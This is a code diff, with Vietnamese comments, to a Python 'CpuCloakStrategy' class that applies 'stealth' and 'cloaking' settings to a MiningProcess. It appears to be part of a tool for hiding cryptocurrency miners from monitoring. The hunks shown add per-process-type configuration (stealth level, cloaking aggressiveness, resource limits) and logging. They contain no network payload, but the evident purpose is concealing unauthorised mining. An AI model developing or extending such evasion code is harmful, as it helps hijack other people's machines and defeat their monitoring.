@@ -116,11 +116,14 @@ class CpuCloakStrategy(CloakStrategy):
         cpu_resource_manager: CPUResourceManager
     ):
         """
-        Khởi tạo CpuCloakStrategy với advanced stealth capabilities.
+        ✅ ENHANCED: Khởi tạo CpuCloakStrategy với metadata-aware capabilities.
         """
         self.logger = logger
         self.config = config
         self.cpu_resource_manager = cast(Any, cpu_resource_manager)
+        
+        # ✅ NEW: Type-specific configuration
+        self.process_type_config = None
 
         # Enhanced: Check for advanced stealth capabilities
         self.advanced_stealth_enabled = False
@@ -647,14 +650,51 @@ class CpuCloakStrategy(CloakStrategy):
             self.logger.error(f"❌ [Verification Error] PID={pid}: {e}")
             return False
 
+    def configure_for_process_type(self, process_type: str, strategy_hints: Dict[str, Any] = None) -> None:
+        """
+        ✅ NEW: Pre-configure strategy cho specific process type.
+        
+        :param process_type: 'CPU' hoặc 'GPU' process type.
+        :param strategy_hints: Optional optimization hints.
+        """
+        strategy_hints = strategy_hints or {}
+        
+        self.process_type_config = {
+            'target_type': process_type,
+            'stealth_requirements': strategy_hints.get('stealth_requirements', 'medium'),
+            'cloaking_aggressiveness': strategy_hints.get('cloaking_aggressiveness', 'moderate'),
+            'resource_limits': strategy_hints.get('resource_limits', {}),
+            'optimization_level': 'aggressive' if process_type == 'GPU' else 'balanced'
+        }
+        
+        self.logger.info(f"🎯 [CPU Strategy] Pre-configured for {process_type} process type")
+        self.logger.debug(f"🔧 [CPU Strategy] Config: {self.process_type_config}")
+
     def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng CPU cloaking với advanced stealth support (đồng bộ).
+        ✅ ENHANCED: Áp dụng CPU cloaking với metadata-aware optimization.
         
-        :param process: Đối tượng MiningProcess.
+        :param process: Enhanced MiningProcess với classification metadata.
         """
         try:
             pid, name = process.pid, process.name
+            
+            # ✅ EXTRACT METADATA từ enhanced MiningProcess
+            process_type = process.get_process_type()
+            strategy_hints = process.get_strategy_hints()
+            hardware_classification = process.get_hardware_classification()
+            
+            self.logger.info(f"🎯 [CPU Strategy] Processing {process_type} process: {name} (PID={pid})")
+            
+            # ✅ AUTO-CONFIGURE nếu chưa được pre-configured
+            if not self.process_type_config:
+                self.configure_for_process_type(process_type, strategy_hints)
+            
+            # ✅ TYPE-SPECIFIC OPTIMIZATION LOGIC
+            optimization_level = self.process_type_config.get('optimization_level', 'balanced')
+            stealth_level = self.process_type_config.get('stealth_requirements', 'medium')
+            
+            self.logger.info(f"🚀 [CPU Strategy] Applying {optimization_level} optimization, stealth={stealth_level}")
 
             # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
             if self.allowed_process_name and name != self.allowed_process_name:
